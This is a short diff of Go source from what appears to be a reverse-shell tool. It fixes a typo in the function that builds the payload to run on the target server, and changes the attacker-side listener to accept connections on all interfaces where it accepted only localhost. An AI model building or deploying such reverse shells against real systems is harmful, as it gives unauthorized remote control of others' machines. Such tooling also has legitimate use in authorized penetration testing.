@@ -62,23 +62,23 @@ func buildReverseShell(port, host, templateFileName, serverOs string) {
 	}
 	handleError("Preaparing compilation", os.Setenv("GOOS", serverOs))
 	handleError("Compiling", exec.Command("go", "build", "-o", finalFileName+fileExt, tmpFileName).Run())
-	handleError("Removeing temp file", os.Remove(tmpFileName))
+	handleError("Removing temp file", os.Remove(tmpFileName))
 	println("[+] Build is done ! The file to execute server side is \"" + finalFileName + fileExt + "\".")
 }
 
 func listenTcp(port string) {
-	listener, err := net.Listen("tcp", "localhost:"+port)
+	listener, err := net.Listen("tcp", ":"+port)
 	handleError("Listening tcp", err)
 	defer listener.Close()
 	connexion, err := listener.Accept()
 	handleError("Accepting connection", err)
-	chan_stdin := synchronizeClientServer(os.Stdin, connexion)
 	chan_stdout := synchronizeClientServer(connexion, os.Stdout)
+	chan_stdin := synchronizeClientServer(os.Stdin, connexion)
 	select {
-	case <-chan_stdin:
-		println("[-] Local connection is closed.") // Should not happen as connexion is at the server initiative, so closing is too
 	case <-chan_stdout:
 		println("[-] Remote connection is closed.")
+	case <-chan_stdin:
+		println("[-] Local connection is closed.") // Should not happen as connexion is at the server initiative, so closing is too
 	}
 }
 
